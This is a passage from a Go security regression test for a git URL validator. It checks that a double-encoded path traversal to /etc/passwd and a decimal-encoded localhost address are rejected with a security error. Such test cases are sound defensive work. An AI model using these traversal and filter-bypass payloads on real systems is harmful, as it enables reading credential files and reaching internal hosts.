			expectedErrorType: "ARGUS_SECURITY_ERROR",
			description:       "URL-encoded path traversal should be blocked after decoding",
		},
		{
			name:              "DoubleEncodedTraversal",
			url:               "git://github.com/user/repo.git#..%252f..%252fetc%252fpasswd",
			expectedErrorType: "ARGUS_SECURITY_ERROR",
			description:       "Double URL-encoded path traversal should be blocked",
		},
		{
			name:              "LocalhostDecimalEncoding",
			url:               "git://2130706433/test/repo.git#config.json",
			expectedErrorType: "ARGUS_SECURITY_ERROR",
			description:       "Decimal-encoded localhost (127.0.0.1) should be blocked",
		},
	}

	for _, test := range regressionTests {
		t.Run(test.name, func(t *testing.T) {
			err := provider.Validate(test.url)
			if err == nil {
				t.Errorf("SECURITY REGRESSION: %s - Expected error but got none", test.description)
			}
			if !strings.Contains(err.Error(), test.expectedErrorType) {
				t.Errorf("SECURITY REGRESSION: %s - Expected %s, got: %v",
					test.description, test.expectedErrorType, err)
			}
		})
	}
}
